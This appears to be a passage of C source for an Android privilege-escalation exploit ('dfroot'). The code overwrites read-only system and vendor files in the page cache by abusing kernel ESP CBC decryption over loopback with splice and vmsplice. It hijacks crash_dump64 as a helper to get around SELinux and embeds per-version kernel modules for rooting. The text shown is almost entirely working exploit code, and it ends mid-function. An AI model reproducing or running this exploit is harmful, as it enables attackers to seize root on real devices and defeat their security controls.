#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <signal.h>
#include <time.h>
#include "aes256.h"

#define eos(s) (s + strlen(s))

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;
static int g_su_mode_magisk = 0;  /* --su-mode magisk: 4.19 uses Magisk instead of ksud */

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[16];
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* Originals saved so the exploit does not leave patched page cache behind. */
static char   *g_crash_orig;
static size_t  g_crash_len;
static struct {
    char   path[128];
    char  *orig;
    size_t len;
    int    valid;
} g_ko_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

static int reapply_helper(void);

static int read_full_fd(int fd, void *buf, size_t n) {
    size_t got = 0;
    while (got < n) {
        ssize_t r = TEMP_FAILURE_RETRY(read(fd, (char *)buf + got, n - got));
        if (r <= 0) return -1;
        got += (size_t)r;
    }
    return 0;
}

static int write_full_fd(int fd, const void *buf, size_t n) {
    size_t done = 0;
    while (done < n) {
        ssize_t r = TEMP_FAILURE_RETRY(write(fd, (const char *)buf + done, n - done));
        if (r <= 0) return -1;
        done += (size_t)r;
    }
    return 0;
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * mode "r" = one-shot read, "b" = batch server, NULL = one-shot splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(const char *path, off_t offset, int write_fd,
                            int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(120);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, path, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, path, NULL);
        _exit(121);
    }
    int st = 0;
    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    return st;
}

/* One-shot helper read (legacy fallback only: one execve per 16-byte block). */
static int read_vendor_content(off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(libcxx_ko_target, offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC block from the app's own file descriptor:
 * 24-byte ESP header -> pipe (vmsplice), 16-byte file page -> pipe (splice),
 * then the 40-byte ESP packet -> UDP socket (kernel decapsulation writes the
 * plaintext back into the spliced page-cache page).
 */
static int cbc_emit_direct(int pipe_rd, int pipe_wr, int sk_send, int file_fd,
                           off_t offset, const uint8_t hdr[24]) {
    struct iovec iov = {.iov_base = (void *)hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }
    off_t off = offset;
    if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
        printf("splice file failed: %s\n", strerror(errno)); return -1;
    }
    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* One-shot helper splice (legacy fallback). */
static int cbc_emit_legacy(int pipe_rd, int pipe_wr, int sk_send, off_t offset,
                           const uint8_t hdr[24]) {
    struct iovec iov = {.iov_base = (void *)hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }
    int st = spawn_crash_dump(libcxx_ko_target, offset, pipe_wr, 1, NULL);
    if (st < 0) return -1;
    if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
        printf("splice helper failed status=0x%x\n", st);
        return -1;
    }
    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* ---- vendor file I/O -------------------------------------------------------
 * Before the LKM loads, SELinux may forbid the app itself to open a vendor
 * library; after the LKM's SELinux patch it does not. Try the app's own fd
 * first (open + pread + splice), because that turns a 13 KiB patch from ~1650
 * execve() calls into pure syscalls. If that is denied, keep ONE crash_dump64
 * helper alive and feed it offset/header records over a pipe (batch mode), so
 * the whole patch still costs a single exec. The original per-block helper is
 * the last resort.
 */
enum { VIO_NONE = 0, VIO_DIRECT, VIO_BATCH, VIO_LEGACY };

struct VendorSession {
    const char *path;
    int   mode;
    int   fd;          /* direct file descriptor */
    pid_t pid;         /* batch helper */
    int   ctrl_wr;     /* parent -> helper records */
    int   ack_rd;      /* helper completion bytes */
    int   pipe_rd;     /* packet pipe */
    int   pipe_wr;
    int   sk_send;
};

#define VS_BATCH_TIMEOUT_MS 5000
#define VS_POLL_SLICE_MS     200

static long long mono_ms(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
        return (long long)time(NULL) * 1000;
    return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

/* Reap the batch helper if it already exited. Returns 1 and fills *status when
 * the child was reaped, 0 while it is still alive. */
static int vs_reap_status(struct VendorSession *vs, int *status) {
    if (vs->pid <= 0) return 0;
    int st = 0;
    pid_t r = waitpid(vs->pid, &st, WNOHANG);
    if (r == vs->pid) {
        vs->pid = -1;
        if (status) *status = st;
        return 1;
    }
    return 0;
}

/* Stop the batch helper without ever blocking forever. Closing the control
 * pipe is the normal shutdown signal; if the helper does not exit (for example
 * because it inherited a duplicate of the write end), kill it after 500 ms. */
static void vs_stop_batch(struct VendorSession *vs) {
    if (vs->ctrl_wr >= 0) { close(vs->ctrl_wr); vs->ctrl_wr = -1; }
    if (vs->ack_rd  >= 0) { close(vs->ack_rd);  vs->ack_rd  = -1; }
    if (vs->pid <= 0) return;

    int st = 0;
    int done = 0;
    for (int i = 0; i < 50; i++) {
        pid_t r = waitpid(vs->pid, &st, WNOHANG);
        if (r == vs->pid) { done = 1; break; }
        if (r < 0) {
            if (errno == EINTR) continue;
            /* ECHILD means someone else already reaped it; do not kill a
             * potentially recycled PID. */
            done = 1;
            break;
        }
        usleep(10000);
    }
    if (!done) {
        printf("vendor io: batch helper did not exit; killing it\n");
        kill(vs->pid, SIGKILL);
        /* Bound the post-kill reap too: a helper stuck in an uninterruptible
         * read must not turn shutdown into another infinite wait. */
        for (int i = 0; i < 50; i++) {
            pid_t r = waitpid(vs->pid, &st, WNOHANG);
            if (r == vs->pid) break;
            if (r < 0 && errno != EINTR) break;
            usleep(10000);
        }
    }
    vs->pid = -1;
}

static int vs_restart_pipe(struct VendorSession *vs) {
    if (vs->pipe_rd >= 0) { close(vs->pipe_rd); vs->pipe_rd = -1; }
    if (vs->pipe_wr >= 0) { close(vs->pipe_wr); vs->pipe_wr = -1; }
    int p[2];
    if (pipe(p) < 0) {
        printf("vendor io: recreate packet pipe failed: %s\n", strerror(errno));
        return -1;
    }
    vs->pipe_rd = p[0];
    vs->pipe_wr = p[1];
    return 0;
}

static int vs_probe_direct(const char *path, int *out_fd) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    uint8_t a[16], b[16];
    if (pread(fd, a, 16, 0) != 16) { close(fd); return 0; }
    int p[2];
    if (pipe(p) < 0) { close(fd); return 0; }
    off_t off = 0;
    int ok = splice(fd, &off, p[1], NULL, 16, SPLICE_F_MOVE) == 16
          && read_full_fd(p[0], b, 16) == 0
          && memcmp(a, b, 16) == 0;
    close(p[0]); close(p[1]);
    if (!ok) { close(fd); return 0; }
    *out_fd = fd;
    return 1;
}

/* Spawn the batch helper with the packet pipe as its stdout. The parent keeps
 * its own write end: it vmsplices the 24-byte ESP header, the helper splices the
 * 16-byte file page, and the parent then sends the 40-byte packet. */
static int vs_start_batch(struct VendorSession *vs) {
    int ctrl[2], ack[2];
    if (pipe(ctrl) < 0) {
        printf("helper ctrl pipe failed: %s\n", strerror(errno));
        return -1;
    }
    if (pipe(ack) < 0) {
        printf("helper ack pipe failed: %s\n", strerror(errno));
        close(ctrl[0]); close(ctrl[1]);
        return -1;
    }
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) {
        printf("helper vfork failed: %s\n", strerror(errno));
        close(ctrl[0]); close(ctrl[1]); close(ack[0]); close(ack[1]);
        return -1;
    }
    if (pid == 0) {
        int c = ctrl[0], d = vs->pipe_wr, a = ack[1];
        /* Save the three ends we need above the inherited descriptor set. */
        c = fcntl(c, F_DUPFD, 32);
        d = fcntl(d, F_DUPFD, 32);
        a = fcntl(a, F_DUPFD, 32);
        if (c < 0 || d < 0 || a < 0) _exit(120);

        /* Close every inherited descriptor, especially ctrl[1]. If the helper
         * keeps a copy of the control pipe's write end, closing the parent's
         * copy never produces EOF, so the helper never exits and vs_close()
         * blocks in waitpid() forever. */
        for (int fd = 0; fd < 256; fd++) {
            if (fd != c && fd != d && fd != a) close(fd);
        }
        close(ctrl[1]);
        close(ack[0]);
        close(vs->pipe_rd);
        if (ctrl[0] != c) close(ctrl[0]);
        if (vs->pipe_wr != d) close(vs->pipe_wr);
        if (ack[1] != a) close(ack[1]);

        if (dup2(d, 1) < 0) _exit(120);
        if (dup2(c, 3) < 0) _exit(120);
        if (dup2(a, 4) < 0) _exit(120);
        close(c); close(d); close(a);
        execl(kCrashDump, "crashdump64", "0", vs->path, "b", NULL);
        _exit(121);
    }
    close(ctrl[0]);
    close(ack[1]);
    vs->pid      = pid;
    vs->ctrl_wr  = ctrl[1];
    vs->ack_rd   = ack[0];

    /* CLONE_VFORK returns after exec() or after a failed exec. Catch an
     * immediate child exit instead of declaring batch mode usable. */
    int st = 0;
    if (vs_reap_status(vs, &st)) {
        printf("vendor io: batch helper exited before use (status 0x%x)\n", st);
        if (vs->ctrl_wr >= 0) { close(vs->ctrl_wr); vs->ctrl_wr = -1; }
        if (vs->ack_rd  >= 0) { close(vs->ack_rd);  vs->ack_rd  = -1; }
        return -1;
    }
    return 0;
}

/* Wait for a batch-helper pipe to become ready, checking whether the helper
 * is still alive on every short poll. Returns 1 ready, 0 timeout, -1 error. */
static int vs_batch_wait(struct VendorSession *vs, int fd, short events,
                         int timeout_ms) {
    long long deadline = mono_ms() + timeout_ms;
    for (;;) {
        long long now = mono_ms();
        if (now >= deadline) return 0;
        int wait_ms = (int)(deadline - now);
        if (wait_ms > VS_POLL_SLICE_MS) wait_ms = VS_POLL_SLICE_MS;

        struct pollfd pfd = {.fd = fd, .events = events, .revents = 0};
        int pr = poll(&pfd, 1, wait_ms);
        if (pr < 0) {
            if (errno == EINTR) continue;
            printf("vendor io: batch poll failed: %s\n", strerror(errno));
            return -1;
        }
        if (pr == 0) {
            int st = 0;
            if (vs_reap_status(vs, &st)) {
                if (WIFEXITED(st))
                    printf("vendor io: batch helper exited (status %d)\n", WEXITSTATUS(st));
                else if (WIFSIGNALED(st))
                    printf("vendor io: batch helper killed by signal %d\n", WTERMSIG(st));
                else
                    printf("vendor io: batch helper exited (status 0x%x)\n", st);
                return -1;
            }
            continue;  /* still alive, keep waiting until the deadline */
        }
        if (pfd.revents & (POLLERR | POLLNVAL)) {
            printf("vendor io: batch pipe error (revents 0x%x)\n", pfd.revents);
            return -1;
        }
        if (pfd.revents & (POLLIN | POLLHUP)) return 1;
    }
}

/* Read exactly len bytes of an 'R' response from the packet pipe. */
static int vs_batch_read_data(struct VendorSession *vs, void *buf, size_t len) {
    size_t got = 0;
    long long deadline = mono_ms() + VS_BATCH_TIMEOUT_MS;
    while (got < len) {
        int remain = (int)(deadline - mono_ms());
        if (remain <= 0) {
            printf("vendor io: batch read timeout (%zu/%zu bytes)\n", got, len);
            return -1;
        }
        int w = vs_batch_wait(vs, vs->pipe_rd, POLLIN, remain);
        if (w <= 0) return -1;

        ssize_t r = TEMP_FAILURE_RETRY(
            read(vs->pipe_rd, (char *)buf + got, len - got));
        if (r < 0) {
            printf("vendor io: batch read failed: %s\n", strerror(errno));
            return -1;
        }
        if (r == 0) {
            printf("vendor io: batch packet pipe closed early\n");
            return -1;
        }
        got += (size_t)r;
    }
    return 0;
}

static int vs_batch_read(struct VendorSession *vs, off_t off, void *buf,
                         size_t len) {
    struct {
        uint8_t  type;
        uint64_t off;
        uint64_t len;
    } __attribute__((packed)) rec;
    rec.type = 'R';
    rec.off  = (uint64_t)off;
    rec.len  = (uint64_t)len;
    if (write_full_fd(vs->ctrl_wr, &rec, sizeof(rec)) < 0) {
        printf("vendor io: batch request failed at 0x%lx: %s\n",
               (long)off, strerror(errno));
        return -1;
    }
    return vs_batch_read_data(vs, buf, len);
}

static int vs_batch_read_ack(struct VendorSession *vs) {
    long long deadline = mono_ms() + VS_BATCH_TIMEOUT_MS;
    for (;;) {
        int remain = (int)(deadline - mono_ms());
        if (remain <= 0) {
            printf("vendor io: batch write ack timeout\n");
            return -1;
        }
        int w = vs_batch_wait(vs, vs->ack_rd, POLLIN, remain);
        if (w <= 0) return -1;

        uint8_t ack;
        ssize_t r = TEMP_FAILURE_RETRY(read(vs->ack_rd, &ack, 1));
        if (r == 1) return 0;
        if (r == 0) {
            printf("vendor io: batch ack pipe closed early\n");
            return -1;
        }
        if (errno == EINTR) continue;
        printf("vendor io: batch ack read failed: %s\n", strerror(errno));
        return -1;
    }
}

/* Move from the broken batch helper to the proven one-shot per-block path. */
static int vs_fallback_legacy(struct VendorSession *vs, const char *why) {
    printf("vendor io: batch %s failed; switching to per-block helper\n", why);
    vs_stop_batch(vs);
    if (vs_restart_pipe(vs) < 0) { vs->mode = VIO_NONE; return -1; }
    vs->mode = VIO_LEGACY;
    /* The failed helper may have been the stock binary; put the splice helper
     * back before the one-shot path starts exec'ing it. Refuse to run a stock
     * crash_dump64 with helper arguments, which can hang in waitpid(). */
    if (!g_crash_orig) {
        printf("vendor io: helper original is unavailable; aborting\n");
        vs->mode = VIO_NONE;
        return -1;
    }
    if (reapply_helper() != 0) {
        printf("vendor io: cannot restore the crash_dump64 helper; aborting\n");
        vs->mode = VIO_NONE;
        return -1;
    }
    return 0;
}

static int vs_open(struct VendorSession *vs, const char *path, int sk_send) {
    static int sigpipe_ignored;
    if (!sigpipe_ignored) {
        signal(SIGPIPE, SIG_IGN);
        sigpipe_ignored = 1;
    }

    memset(vs, 0, sizeof(*vs));
    vs->path = path;
    vs->fd = -1; vs->pid = -1;
    vs->ctrl_wr = -1; vs->ack_rd = -1;
    vs->pipe_rd = -1; vs->pipe_wr = -1;
    vs->sk_send = sk_send;

    int p[2];
    if (pipe(p) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
    vs->pipe_rd = p[0];
    vs->pipe_wr = p[1];

    int fd = -1;
    if (vs_probe_direct(path, &fd)) {
        vs->mode = VIO_DIRECT;
        vs->fd = fd;
        printf("vendor io: direct (no helper exec)\n");
        return 0;
    }

    printf("vendor io: direct access denied; using crash_dump helper\n");
    /* The LKM drops crash_dump64's patched page cache at load time, which
     * reverts the helper to the stock binary. Put the helper back before use. */
    if (reapply_helper() != 0) {
        printf("vendor io: crash_dump64 helper is unavailable; aborting\n");
        return -1;
    }
    if (vs_start_batch(vs) == 0) {
        /* Probe the protocol once. This catches a helper that exited during
         * exec/open before the real patch starts, and avoids hanging later. */
        uint8_t probe[16];
        if (vs_batch_read(vs, 0, probe, sizeof(probe)) == 0) {
            vs->mode = VIO_BATCH;
            printf("vendor io: batched helper (1 exec per operation)\n");
            return 0;
        }
        printf("vendor io: batch helper probe failed; using the per-block helper\n");
    } else {
        printf("vendor io: batch helper could not start; using the per-block helper\n");
    }

    /* Either the helper ran and failed the probe, or it never started. Stop it,
     * discard any partial packet data, and fall back to the one-shot path. */
    vs_stop_batch(vs);
    if (vs_restart_pipe(vs) < 0) return -1;
    if (reapply_helper() != 0) {
        printf("vendor io: cannot restore the crash_dump64 helper; aborting\n");
        return -1;
    }
    vs->mode = VIO_LEGACY;
    printf("vendor io: per-block helper (legacy fallback)\n");
    return 0;
}

static void vs_close(struct VendorSession *vs) {
    if (vs->mode == VIO_BATCH || vs->pid > 0)
        vs_stop_batch(vs);
    if (vs->ctrl_wr >= 0) { close(vs->ctrl_wr); vs->ctrl_wr = -1; }
    if (vs->ack_rd  >= 0) { close(vs->ack_rd);  vs->ack_rd  = -1; }
    if (vs->pipe_rd >= 0) { close(vs->pipe_rd); vs->pipe_rd = -1; }
    if (vs->pipe_wr >= 0) { close(vs->pipe_wr); vs->pipe_wr = -1; }
    if (vs->fd      >= 0) { close(vs->fd);      vs->fd      = -1; }
    vs->pid = -1;
}

static int vs_read(struct VendorSession *vs, off_t off, void *buf, size_t len) {
    if (vs->mode == VIO_DIRECT) {
        size_t done = 0;
        while (done < len) {
            ssize_t n = pread(vs->fd, (char *)buf + done, len - done,
                              off + (off_t)done);
            if (n <= 0) {
                printf("pread vendor at 0x%lx failed: %s\n",
                       (long)(off + (off_t)done), strerror(errno));
                return -1;
            }
            done += (size_t)n;
        }
        return 0;
    }
    if (vs->mode == VIO_BATCH) {
        off_t start_off = off;
        void *start_buf = buf;
        size_t start_len = len;
        int ok = 1;
        while (len) {
            size_t chunk = len > 32768 ? 32768 : len;
            if (vs_batch_read(vs, off, buf, chunk) < 0) { ok = 0; break; }
            off += (off_t)chunk;
            buf  = (char *)buf + chunk;
            len -= chunk;
        }
        if (ok) return 0;

        /* A batch failure must never leave the caller spinning. Re-read the
         * complete original range with the one-shot per-block helper. */
        if (vs_fallback_legacy(vs, "read") < 0) return -1;
        off = start_off;
        buf = start_buf;
        len = start_len;
    }
    for (size_t i = 0; i < len / 16; i++) {
        if (read_vendor_content(off + (off_t)(i * 16),
                                (uint8_t *)buf + i * 16) < 0)
            return -1;
    }
    return 0;
}

static int vs_write(struct VendorSession *vs, off_t off, const uint8_t hdr[24]) {
    if (vs->mode == VIO_DIRECT)
        return cbc_emit_direct(vs->pipe_rd, vs->pipe_wr, vs->sk_send, vs->fd, off, hdr);

    if (vs->mode == VIO_BATCH) {
        /* Same packet layout as cbc_emit_direct(): the parent supplies the
         * 24-byte header, the helper appends the 16-byte file page. */
        struct iovec iov = {.iov_base = (void *)hdr, .iov_len = 24};
        int ok = 0;
        if (vmsplice(vs->pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
            printf("vmsplice hdr failed: %s\n", strerror(errno));
        } else {
            uint8_t rec[9];
            rec[0] = 'W';
            memcpy(rec + 1, &off, 8);
            if (write_full_fd(vs->ctrl_wr, rec, sizeof(rec)) < 0) {
                printf("batch helper request failed at 0x%lx: %s\n",
                       (long)off, strerror(errno));
            } else if (vs_batch_read_ack(vs) < 0) {
                printf("batch helper write failed at 0x%lx\n", (long)off);
            } else {
                ssize_t s = splice(vs->pipe_rd, NULL, vs->sk_send, NULL, 40, 0);
                if (s == 40) {
                    ok = 1;
                } else {
                    printf("splice pipe->udp: %zd expected 40\n", s);
                }
            }
        }
        if (ok) return 0;

        /* The header (and possibly the file page) may still be in the packet
         * pipe. Restart it, then retry the same CBC block through the proven
         * one-shot helper. Rewriting the same block is idempotent. */
        if (vs_fallback_legacy(vs, "write") < 0) return -1;
    }
    return cbc_emit_legacy(vs->pipe_rd, vs->pipe_wr, vs->sk_send, off, hdr);
}

/* 0 = every byte matches, 1 = mismatch, -1 = could not read. */
static int vendor_verify(const char *path, off_t foff, const char *want, size_t len) {
    struct VendorSession vs;
    if (vs_open(&vs, path, -1) < 0) return -1;
    char buf[4096];
    int rc = 0;
    size_t done = 0;
    while (done < len) {
        size_t chunk = len - done > sizeof(buf) ? sizeof(buf) : len - done;
        if (vs_read(&vs, foff + (off_t)done, buf, chunk) < 0) { rc = -1; break; }
        if (memcmp(buf, want + done, chunk) != 0) { rc = 1; break; }
        done += chunk;
    }
    vs_close(&vs);
    return rc;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content and splices the file page
 * with the app's own fd.
 * For vendor files (use_helper=1): opens a VendorSession, which picks direct
 * access, one batched crash_dump64 helper, or the legacy per-block helper.
 * len must be a multiple of 16.
 */
static int patch_file_cbc_ex(const char *path, const char *payload, size_t len,
                              size_t foff, int use_helper,
                              char *capture, size_t capture_cap,
                              size_t *restorable) {
    if (restorable) *restorable = 0;
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    int pfd[2] = {-1, -1};
    struct VendorSession vs;
    int have_vs = 0;

    if (use_helper) {
        if (vs_open(&vs, path, sk_send) < 0) { close(sk_send); return -1; }
        have_vs = 1;
    } else {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
        if (pipe(pfd) < 0) {
            printf("pipe failed: %s\n", strerror(errno));
            close(file_fd); close(sk_send);
            return -1;
        }
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (have_vs) {
            if (vs_read(&vs, off, old_content, 16) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        if (capture && capture_cap >= (i + 1) * 16) {
            memcpy(capture + i * 16, old_content, 16);
            if (restorable) *restorable = i + 1;
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        uint8_t hdr[24];
        *(uint32_t *)(hdr + 0) = htonl(g_spi);
        *(uint32_t *)(hdr + 4) = htonl(g_seq++);
        memcpy(hdr + 8, iv, 16);

        int wr = have_vs
               ? vs_write(&vs, off, hdr)
               : cbc_emit_direct(pfd[0], pfd[1], sk_send, file_fd, off, hdr);
        if (wr < 0) {
            printf("write #%zu at 0x%lx failed\n", i, (long)off);
            rc = -1; break;
        }
    }

    if (have_vs) {
        vs_close(&vs);
    } else {
        close(pfd[0]); close(pfd[1]);
        close(file_fd);
    }
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    return patch_file_cbc_ex(path, payload, len, foff, use_helper, NULL, 0, NULL);
}

/* ---- KO and splicehelper blobs ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_12_4_19_start\n.global dfroot_ko_12_4_19_end\n"
    "dfroot_ko_12_4_19_start:\n.incbin \"ko/dfroot-android12-4.19.ko\"\ndfroot_ko_12_4_19_end:\n"
    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_12_4_19_start[], dfroot_ko_12_4_19_end[];
extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 4, 19, dfroot_ko_12_4_19_start, dfroot_ko_12_4_19_end},
        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
